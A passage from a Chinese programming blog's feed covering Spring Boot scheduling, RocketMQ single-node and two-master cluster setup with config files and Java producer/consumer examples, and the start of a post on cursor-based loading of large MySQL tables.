class="meta">@EnableScheduling</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        SpringApplication.run(Application.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="第四步-打包运行"><a href="#第四步-打包运行" class="headerlink" title="第四步 打包运行"></a>第四步 打包运行</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd scheduled-task-test</span><br><span class="line">mvn clean package</span><br><span class="line">java -jar target/scheduled-task-test-1.0.jar</span><br></pre></td></tr></table></figure>
<p>扩展知识：如果不想使用spring的任务调度，可以使用jdk自带的任务调度类</p>
<p>ScheduledExecutorService#schedule</p>
<p>ScheduledExecutorService#scheduleAtFixedRate</p>
<p>ScheduledExecutorService#scheduleWithFixedDelay</p>
<p>今天的分享就到这里了。谢谢阅读。</p>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> spring-boot </tag>
            
            <tag> spring </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[rocketmq集群搭建]]></title>
      <url>/2017/rocketmq-02/</url>
      <content type="html"><![CDATA[<p>上一章讲解了rocketmq的消息发送与接收，那么这篇文章讲解如何安装rocketmq</p>
<h2 id="单机搭建"><a href="#单机搭建" class="headerlink" title="单机搭建"></a>单机搭建</h2><h3 id="1-安装包准备"><a href="#1-安装包准备" class="headerlink" title="1. 安装包准备"></a>1. 安装包准备</h3><p>上传apache-rocketmq.tar.gz至/opt目录</p>
<p><a href="">http://download.csdn.net/download/xxzblog/10124706</a></p>
<p>机器ip：192.168.1.101</p>
<a id="more"></a>
<h3 id="2-安装"><a href="#2-安装" class="headerlink" title="2. 安装"></a>2. 安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /opt</span><br><span class="line">tar -xzf apache-rocketmq.tar.gz</span><br><span class="line">mv apache-rocketmq rocketmq</span><br><span class="line">mkdir /opt/rocketmq/logs</span><br><span class="line">cd /opt/rocketmq/bin &amp;&amp; dos2unix *</span><br></pre></td></tr></table></figure>
<h3 id="3-环境配置"><a href="#3-环境配置" class="headerlink" title="3. 环境配置"></a>3. 环境配置</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">cp /opt/rocketmq/conf/broker.conf /opt/rocketmq/conf/broker.properties</span><br><span class="line">echo "brokerIP1=192.168.1.101" &gt; /opt/rocketmq/conf/broker.properties</span><br><span class="line"></span><br><span class="line">vi /opt/rocketmq/mqnamesrv-start.sh</span><br><span class="line">export ROCKETMQ_HOME=/opt/rocketmq</span><br><span class="line">nohup sh /opt/rocketmq/bin/mqnamesrv &gt; /opt/rocketmq/logs/mqnamesrv.log 2&gt;&amp;1 &amp;</span><br><span class="line">:x</span><br><span class="line">chmod u+x /opt/rocketmq/mqnamesrv-start.sh</span><br><span class="line"></span><br><span class="line">vi /opt/rocketmq/mqbroker-start.sh</span><br><span class="line">export ROCKETMQ_HOME=/opt/rocketmq</span><br><span class="line">nohup sh /opt/rocketmq/bin/mqbroker -n 192.168.1.101:9876 -c /opt/rocketmq/conf/broker.properties &gt; /opt/rocketmq/logs/mqbroker.log 2&gt;&amp;1 &amp;</span><br><span class="line">:x</span><br><span class="line">chmod u+x /opt/rocketmq/mqbroker-start.sh</span><br></pre></td></tr></table></figure>
<h2 id="集群搭建"><a href="#集群搭建" class="headerlink" title="集群搭建"></a>集群搭建</h2><h3 id="1-2同单机一样"><a href="#1-2同单机一样" class="headerlink" title="1, 2同单机一样"></a>1, 2同单机一样</h3><p>本文配置2m-noslave，机器ip：192.168.1.101，192.168.1.102</p>
<h3 id="3-环境配置-1"><a href="#3-环境配置-1" class="headerlink" title="3.环境配置"></a>3.环境配置</h3><p>/opt/rocketmq/conf/2m-noslave/broker-a.properties</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>所属集群名字  </span><br><span class="line">brokerClusterName=DefaultCluster</span><br><span class="line"><span class="meta">#</span>broker名字,注意此处不同的配置文件填写的不一样</span><br><span class="line">brokerName=broker-a</span><br><span class="line"><span class="meta">#</span>0 表示 Master,&gt;0 表示 Slave</span><br><span class="line">brokerId=0</span><br><span class="line"><span class="meta">#</span>nameServer地址,分号分割</span><br><span class="line">namesrvAddr=192.168.1.101:9876;192.168.1.102:9876</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>关键</span><br><span class="line">brokerIP1=192.168.1.101</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>在发送消息时,自动创建服务器不存在的topic,默认创建的队列数</span><br><span class="line">defaultTopicQueueNums=4</span><br><span class="line"><span class="meta">#</span>是否允许 Broker 自动创建Topic,建议线下开启,线上关闭</span><br><span class="line">autoCreateTopicEnable=true</span><br><span class="line"><span class="meta">#</span>是否允许 Broker 自动创建订阅组,建议线下开启,线上关闭</span><br><span class="line">autoCreateSubscriptionGroup=true</span><br><span class="line"><span class="meta">#</span>Broker 对外服务的监听端口</span><br><span class="line">listenPort=10911</span><br><span class="line"><span class="meta">#</span>删除文件时间点,默认凌晨 4点</span><br><span class="line">deleteWhen=04</span><br><span class="line"><span class="meta">#</span>文件保留时间,默认 48 小时</span><br><span class="line">fileReservedTime=48</span><br><span class="line"><span class="meta">#</span>commitLog每个文件的大小默认1G</span><br><span class="line">mapedFileSizeCommitLog=1073741824</span><br><span class="line"><span class="meta">#</span>ConsumeQueue每个文件默认存30W条,根据业务情况调整</span><br><span class="line">mapedFileSizeConsumeQueue=300000</span><br><span class="line"><span class="meta">#</span>destroyMapedFileIntervalForcibly=120000</span><br><span class="line"><span class="meta">#</span>redeleteHangedFileInterval=120000</span><br><span class="line"><span class="meta">#</span>检测物理文件磁盘空间</span><br><span class="line">diskMaxUsedSpaceRatio=88</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>这里是我的 日志配置</span><br><span class="line"><span class="meta">#</span>存储路径</span><br><span class="line">storePathRootDir=/opt/rocketmq/store</span><br><span class="line"><span class="meta">#</span>commitLog 存储路径</span><br><span class="line">storePathCommitLog=/opt/rocketmq/store/commitlog</span><br><span class="line"><span class="meta">#</span>消费队列存储路径存储路径</span><br><span class="line">storePathConsumeQueue=/opt/rocketmq/store/consumequeue</span><br><span class="line"><span class="meta">#</span>消息索引存储路径</span><br><span class="line">storePathIndex=/opt/rocketmq/store/index</span><br><span class="line"><span class="meta">#</span>checkpoint 文件存储路径</span><br><span class="line">storeCheckpoint=/opt/rocketmq/store/checkpoint</span><br><span class="line"><span class="meta">#</span>abort 文件存储路径</span><br><span class="line">abortFile=/opt/rocketmq/store/abort</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>限制的消息大小  </span><br><span class="line">maxMessageSize=65536</span><br><span class="line"><span class="meta">#</span>flushCommitLogLeastPages=4</span><br><span class="line"><span class="meta">#</span>flushConsumeQueueLeastPages=2</span><br><span class="line"><span class="meta">#</span>flushCommitLogThoroughInterval=10000</span><br><span class="line"><span class="meta">#</span>flushConsumeQueueThoroughInterval=60000</span><br><span class="line"><span class="meta">#</span>Broker 的角色</span><br><span class="line"><span class="meta">#</span>- ASYNC_MASTER 异步复制Master</span><br><span class="line"><span class="meta">#</span>- SYNC_MASTER 同步双写Master</span><br><span class="line"><span class="meta">#</span>- SLAVE</span><br><span class="line">brokerRole=ASYNC_MASTER</span><br><span class="line"><span class="meta">#</span>刷盘方式</span><br><span class="line"><span class="meta">#</span>- ASYNC_FLUSH 异步刷盘</span><br><span class="line"><span class="meta">#</span>- SYNC_FLUSH 同步刷盘</span><br><span class="line">flushDiskType=ASYNC_FLUSH</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>checkTransactionMessageEnable=false</span><br><span class="line"><span class="meta">#</span>发消息线程池数量</span><br><span class="line"><span class="meta">#</span>sendMessageThreadPoolNums=128</span><br><span class="line"><span class="meta">#</span>拉消息线程池数量</span><br><span class="line"><span class="meta">#</span>pullMessageThreadPoolNums=128</span><br></pre></td></tr></table></figure>
<p>/opt/rocketmq/conf/2m-noslave/broker-b.properties</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>所属集群名字  </span><br><span class="line">brokerClusterName=DefaultCluster</span><br><span class="line"><span class="meta">#</span>broker名字,注意此处不同的配置文件填写的不一样</span><br><span class="line">brokerName=broker-b</span><br><span class="line"><span class="meta">#</span>0 表示 Master,&gt;0 表示 Slave</span><br><span class="line">brokerId=0</span><br><span class="line"><span class="meta">#</span>nameServer地址,分号分割</span><br><span class="line">namesrvAddr=192.168.1.101:9876;192.168.1.102:9876</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>关键</span><br><span class="line">brokerIP1=192.168.1.102</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>在发送消息时,自动创建服务器不存在的topic,默认创建的队列数</span><br><span class="line">defaultTopicQueueNums=4</span><br><span class="line"><span class="meta">#</span>是否允许 Broker 自动创建Topic,建议线下开启,线上关闭</span><br><span class="line">autoCreateTopicEnable=true</span><br><span class="line"><span class="meta">#</span>是否允许 Broker 自动创建订阅组,建议线下开启,线上关闭</span><br><span class="line">autoCreateSubscriptionGroup=true</span><br><span class="line"><span class="meta">#</span>Broker 对外服务的监听端口</span><br><span class="line">listenPort=10911</span><br><span class="line"><span class="meta">#</span>删除文件时间点,默认凌晨 4点</span><br><span class="line">deleteWhen=04</span><br><span class="line"><span class="meta">#</span>文件保留时间,默认48小时</span><br><span class="line">fileReservedTime=48</span><br><span class="line"><span class="meta">#</span>commitLog每个文件的大小默认1G</span><br><span class="line">mapedFileSizeCommitLog=1073741824</span><br><span class="line"><span class="meta">#</span>ConsumeQueue每个文件默认存30W条,根据业务情况调整</span><br><span class="line">mapedFileSizeConsumeQueue=300000</span><br><span class="line"><span class="meta">#</span>destroyMapedFileIntervalForcibly=120000</span><br><span class="line"><span class="meta">#</span>redeleteHangedFileInterval=120000</span><br><span class="line"><span class="meta">#</span>检测物理文件磁盘空间</span><br><span class="line">diskMaxUsedSpaceRatio=88</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>这里是我的 日志配置</span><br><span class="line"><span class="meta">#</span>存储路径</span><br><span class="line">storePathRootDir=/opt/rocketmq/store</span><br><span class="line"><span class="meta">#</span>commitLog 存储路径</span><br><span class="line">storePathCommitLog=/opt/rocketmq/store/commitlog</span><br><span class="line"><span class="meta">#</span>消费队列存储路径存储路径</span><br><span class="line">storePathConsumeQueue=/opt/rocketmq/store/consumequeue</span><br><span class="line"><span class="meta">#</span>消息索引存储路径</span><br><span class="line">storePathIndex=/opt/rocketmq/store/index</span><br><span class="line"><span class="meta">#</span>checkpoint 文件存储路径</span><br><span class="line">storeCheckpoint=/opt/rocketmq/store/checkpoint</span><br><span class="line"><span class="meta">#</span>abort 文件存储路径</span><br><span class="line">abortFile=/opt/rocketmq/store/abort</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>限制的消息大小  </span><br><span class="line">maxMessageSize=65536</span><br><span class="line"><span class="meta">#</span>flushCommitLogLeastPages=4</span><br><span class="line"><span class="meta">#</span>flushConsumeQueueLeastPages=2</span><br><span class="line"><span class="meta">#</span>flushCommitLogThoroughInterval=10000</span><br><span class="line"><span class="meta">#</span>flushConsumeQueueThoroughInterval=60000</span><br><span class="line"><span class="meta">#</span>Broker 的角色</span><br><span class="line"><span class="meta">#</span>- ASYNC_MASTER 异步复制Master</span><br><span class="line"><span class="meta">#</span>- SYNC_MASTER 同步双写Master</span><br><span class="line"><span class="meta">#</span>- SLAVE</span><br><span class="line">brokerRole=ASYNC_MASTER</span><br><span class="line"><span class="meta">#</span>刷盘方式</span><br><span class="line"><span class="meta">#</span>- ASYNC_FLUSH 异步刷盘</span><br><span class="line"><span class="meta">#</span>- SYNC_FLUSH 同步刷盘</span><br><span class="line">flushDiskType=ASYNC_FLUSH</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>checkTransactionMessageEnable=false</span><br><span class="line"><span class="meta">#</span>发消息线程池数量</span><br><span class="line"><span class="meta">#</span>sendMessageThreadPoolNums=128</span><br><span class="line"><span class="meta">#</span>拉消息线程池数量</span><br><span class="line"><span class="meta">#</span>pullMessageThreadPoolNums=128</span><br></pre></td></tr></table></figure>
<p>启动nameserver脚本[两台机器]</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/rocketmq/bin</span><br><span class="line">nohup sh mqnamesrv &amp;</span><br></pre></td></tr></table></figure>
<p>启动BrokerServer</p>
<p>192.168.1.101</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup sh /opt/rocketmq/bin/mqbroker -c /opt/rocketmq/conf/2m-noslave/broker-a.properties &gt; /opt/rocketmq/logs/mqbroker.log  2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
<p>192.168.1.102</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup sh /opt/rocketmq/bin/mqbroker -c /opt/rocketmq/conf/2m-noslave/broker-b.properties &gt; /opt/rocketmq/logs/mqbroker.log  2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
<p><strong>备注：可以执行对os的优化/opt/rocketmq/bin/os.sh</strong></p>
<h2 id="rocketmq-console搭建"><a href="#rocketmq-console搭建" class="headerlink" title="rocketmq-console搭建"></a>rocketmq-console搭建</h2><h3 id="1-安装包准备-1"><a href="#1-安装包准备-1" class="headerlink" title="1.安装包准备"></a>1.安装包准备</h3><p>上传rocketmq-console-ng-1.0.0.jar至/opt/rocketmq-console</p>
<p><a href="">http://download.csdn.net/download/xxzblog/10124810</a></p>
<h3 id="2-启动脚本"><a href="#2-启动脚本" class="headerlink" title="2. 启动脚本"></a>2. 启动脚本</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vi /opt/rocketmq-console/start.sh</span><br><span class="line">nohup java -jar rocketmq-console-ng-1.0.0.jar --server.port=12581 --rocketmq.config.namesrvAddr=192.168.1.101:9876,192.168.1.102:9876 &gt;/opt/rocketmq-console/run.log 2&gt;&amp;1 &amp;</span><br><span class="line">:x</span><br><span class="line">chmod u+x /opt/rocketmq-console/start.sh</span><br></pre></td></tr></table></figure>
<h3 id="3-执行脚本"><a href="#3-执行脚本" class="headerlink" title="3. 执行脚本"></a>3. 执行脚本</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/opt/rocketmq-console/start.sh</span><br></pre></td></tr></table></figure>
<h3 id="4-验证是否成功"><a href="#4-验证是否成功" class="headerlink" title="4. 验证是否成功"></a>4. 验证是否成功</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">浏览器打开:http://127.0.0.1:12581</span><br></pre></td></tr></table></figure>
<p>整个rocketmq搭建就结束了</p>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> rocketmq </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[RocketMQ 入门]]></title>
      <url>/2017/rocketmq-01/</url>
      <content type="html"><![CDATA[<p>本文讲解前不久进入apache顶级项目的RocketMQ，几个简单的例子讲解如何搭建RocketMQ，以及发送消息，接受消息。</p>
<a id="more"></a>
<h2 id="RocketMQ安装"><a href="#RocketMQ安装" class="headerlink" title="RocketMQ安装"></a>RocketMQ安装</h2><p>RocketMQ的安装需要自行编译，接下来编译源码(本文下载源码放在windows系统<code>D:\softwares\</code>目录下)</p>
<ol>
<li><p>下载源码</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone -b develop https://github.com/apache/rocketmq.git</span><br></pre></td></tr></table></figure>
</li>
<li><p>编译</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd rocketmq</span><br><span class="line">mvn -Prelease-all -DskipTests clean install -U</span><br></pre></td></tr></table></figure>
</li>
<li><p>启动rocketmq</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd distribution\target\apache-rocketmq</span><br><span class="line">set ROCKETMQ_HOME=D:\softwares\rocketmq\distribution\target\apache-rocketmq</span><br><span class="line">bin\mqnamesrv.cmd</span><br><span class="line"><span class="meta">#</span> 再开启一个cmd窗口，进入到D:\softwares\rocketmq\distribution\target\apache-rocketmq</span><br><span class="line">d:</span><br><span class="line">cd D:\softwares\rocketmq\distribution\target\apache-rocketmq</span><br><span class="line">set ROCKETMQ_HOME=D:\softwares\rocketmq\distribution\target\apache-rocketmq</span><br><span class="line">bin\mqbroker.cmd -n localhost:9876</span><br></pre></td></tr></table></figure>
<p>mqnamesrv启动成功</p>
<p><img src="http://ws3.sinaimg.cn/large/afc434bdly1fl5b6wbuhwj20is03yt8r.jpg" alt="image"></p>
<p>mqbroker启动后无输出</p>
<p><strong><em>PS:不要关闭两个窗口</em></strong></p>
<p>下面开始代码，写发送消息，接受消息。</p>
<p>引入maven依赖</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.rocketmq<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rocketmq-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.0-incubating<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>发送消息</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.xxz.test.mq;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.rocketmq.client.exception.MQBrokerException;</span><br><span class="line"><span class="keyword">import</span> org.apache.rocketmq.client.exception.MQClientException;</span><br><span class="line"><span class="keyword">import</span> org.apache.rocketmq.client.producer.DefaultMQProducer;</span><br><span class="line"><span class="keyword">import</span> org.apache.rocketmq.client.producer.SendResult;</span><br><span class="line"><span class="keyword">import</span> org.apache.rocketmq.client.producer.SendStatus;</span><br><span class="line"><span class="keyword">import</span> org.apache.rocketmq.common.message.Message;</span><br><span class="line"><span class="keyword">import</span> org.apache.rocketmq.remoting.exception.RemotingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProducerTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> MQClientException, RemotingException, MQBrokerException, InterruptedException </span>&#123;</span><br><span class="line">        DefaultMQProducer producer = <span class="keyword">new</span> DefaultMQProducer(<span class="string">"producerGroup"</span>);</span><br><span class="line">        producer.setNamesrvAddr(<span class="string">"127.0.0.1:9876"</span>);</span><br><span class="line">        producer.start();</span><br><span class="line">        Message msg = <span class="keyword">new</span> Message();</span><br><span class="line">        msg.setTopic(<span class="string">"test"</span>);</span><br><span class="line">        msg.setBody(<span class="string">"hello rocketmq"</span>.getBytes());</span><br><span class="line">        SendResult sendResult = producer.send(msg);</span><br><span class="line">        <span class="keyword">if</span> (sendResult.getSendStatus() == SendStatus.SEND_OK) &#123;</span><br><span class="line">            System.out.println(<span class="string">"send msg ok..."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        producer.shutdown();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​</p>
<p><img src="http://wx2.sinaimg.cn/large/afc434bdly1fl5ule8s8tj20lq0fuwhj.jpg" alt="image"></p>
<p>接受消息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">package org.xxz.test.mq;</span><br><span class="line">import java.nio.charset.StandardCharsets;</span><br><span class="line">import java.util.List;</span><br><span class="line">import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;</span><br><span class="line">import org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;</span><br><span class="line">import org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;</span><br><span class="line">import org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;</span><br><span class="line">import org.apache.rocketmq.client.exception.MQClientException;</span><br><span class="line">import org.apache.rocketmq.common.message.MessageExt;</span><br><span class="line">public class ConsumerTest &#123;</span><br><span class="line">    </span><br><span class="line">    public static void main(String[] args) throws MQClientException &#123;</span><br><span class="line">        DefaultMQPushConsumer consumer = new DefaultMQPushConsumer(&quot;consumerGroup&quot;);</span><br><span class="line">        consumer.setNamesrvAddr(&quot;127.0.0.1:9876&quot;);</span><br><span class="line">        consumer.subscribe(&quot;test&quot;, &quot;*&quot;);</span><br><span class="line">        consumer.registerMessageListener(new MessageListenerConcurrently() &#123;</span><br><span class="line">            </span><br><span class="line">            @Override</span><br><span class="line">            public ConsumeConcurrentlyStatus consumeMessage(List&lt;MessageExt&gt; msgs, ConsumeConcurrentlyContext context) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    for (MessageExt msg : msgs) &#123;</span><br><span class="line">                        System.out.println(new String(msg.getBody(), StandardCharsets.UTF_8));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; catch (Exception e) &#123;</span><br><span class="line">                    return ConsumeConcurrentlyStatus.RECONSUME_LATER;</span><br><span class="line">                &#125;</span><br><span class="line">                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        consumer.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="http://wx2.sinaimg.cn/large/afc434bdly1fl5ulhelqoj20q50g5q67.jpg" alt="image"></p>
<p>​</p>
<p>就是这么简单，后续更精彩哦。。。</p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> rocketmq </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[如何从数据库加载1000w数据]]></title>
      <url>/2017/how-to-fetch-1000w-from-db/</url>
      <content type="html"><![CDATA[<p>这篇文章主要讲解 如何从数据库加载1000w数据</p>
<h3 id="加载大量数据"><a href="#加载大量数据" class="headerlink" title="加载大量数据"></a>加载大量数据</h3><p>例子：将1000w的数据从数据库导入到redis中</p>
<p>在mysql中的实现方法：1、limit 分页 2、游标<br><a id="more"></a></p>
<h4 id="limit-分页"><a href="#limit-分页" class="headerlink" title="limit 分页"></a>limit 分页</h4><p>问题：</p>
<p>当offset很大时，mysql需要做大量的文件排序操作，很影响性能。可以加上合适的 order by 子句，效率会有所改善。</p>
<h4 id="游标"><a href="#游标" class="headerlink" title="游标"></a>游标</h4><p>问题：</p>
<p>默认mysql驱动加载游标数据是一次性把所有数据cache到java内存中，那么1000w的数据会导致java堆栈溢出。</p>
<p>在这里，我们可以在jdbc.url 添加一些参数来解决java堆栈溢出问题。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql://xxx.xxx.xxx.xxx:3306/test?useUnicode=true&amp;characterEncoding=UTF-8&amp;useCursorFetch=true&amp;defaultFetchSize=1000</span><br></pre></td></tr></table></figure>
<ul>
<li>useCursorFetch：表示使用游标获取</li>
<li>defaultFetchSize：表示每次游标获取的大小</li>
</ul>
